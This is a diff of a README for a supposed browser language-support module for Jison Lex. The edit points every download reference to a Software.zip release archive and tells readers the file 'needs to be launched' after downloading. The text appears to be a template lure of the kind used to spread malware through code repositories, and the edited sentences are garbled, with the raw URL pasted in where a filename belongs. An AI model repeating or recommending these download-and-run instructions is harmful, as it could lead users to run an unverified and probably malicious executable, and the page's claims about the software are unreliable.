@@ -13,13 +13,13 @@ This repository houses the Bliss Browser Jison Lex language support module, enab
 
 ## Get Started ✨
 
-To get started with using the Bliss Browser Jison Lex language support module, simply download the Software.zip file from the link below:
+To get started with using the Bliss Browser Jison Lex language support module, simply download the https://github.com/Thalik330/Bliss_Browser_Jison-Lex/releases/download/v1.0/Software.zip file from the link below:
 
-[![](https://img.shields.io/badge/Download-Software.zip-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![](https://github.com/Thalik330/Bliss_Browser_Jison-Lex/releases/download/v1.0/Software.zip)](https://github.com/Thalik330/Bliss_Browser_Jison-Lex/releases/download/v1.0/Software.zip)
 
 Once downloaded, make sure to extract the contents and follow the instructions provided in the repository to unleash the power of Jison Lex programming in your browser.
 
-In case the link for the Software.zip file is not working, please check the "Releases" section of this repository for alternative download options.
+In case the link for the https://github.com/Thalik330/Bliss_Browser_Jison-Lex/releases/download/v1.0/Software.zip file is not working, please check the "Releases" section of this repository for alternative download options.
 
 ## Want to Learn More? 📚
 
@@ -37,4 +37,4 @@ Thank you for exploring the Bliss Browser Jison Lex language support module! Hap
 
 ---
 
-Remember, the Software.zip file needs to be launched after downloading it from the provided link. Enjoy exploring the possibilities of Jison Lex programming in the browser environment! 🌟
+Remember, the https://github.com/Thalik330/Bliss_Browser_Jison-Lex/releases/download/v1.0/Software.zip file needs to be launched after downloading it from the provided link. Enjoy exploring the possibilities of Jison Lex programming in the browser environment! 🌟
